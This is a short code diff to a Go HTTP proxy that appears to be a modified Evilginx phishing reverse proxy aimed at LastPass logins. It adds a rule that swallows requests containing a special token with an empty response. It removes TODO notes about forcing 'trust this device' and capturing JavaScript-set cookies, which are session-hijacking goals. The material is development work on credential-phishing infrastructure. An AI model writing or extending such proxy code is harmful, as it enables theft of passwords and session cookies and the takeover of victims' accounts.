@@ -431,6 +431,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
+
+						if strings.Contains(string(body), "__ex_ignore__") {
+							// Do not pass to the application if it contains some special token
+							resp := goproxy.NewResponse(req, "text/html", http.StatusOK, "")
+			    			return req, resp
+						} 
+
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
@@ -462,8 +469,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         		delete(req.Header, "X-Evilginx");
     		};
 
-    		// TODO: Set "Trust this device for 30 days"
-        	// TODO: Get the necessary cookies set by javascript
     		// For some reason POST requests with empty bodies causes an error with Lastpass
     		_, content_length := req.Header["Content-Length"];
     		if content_length {
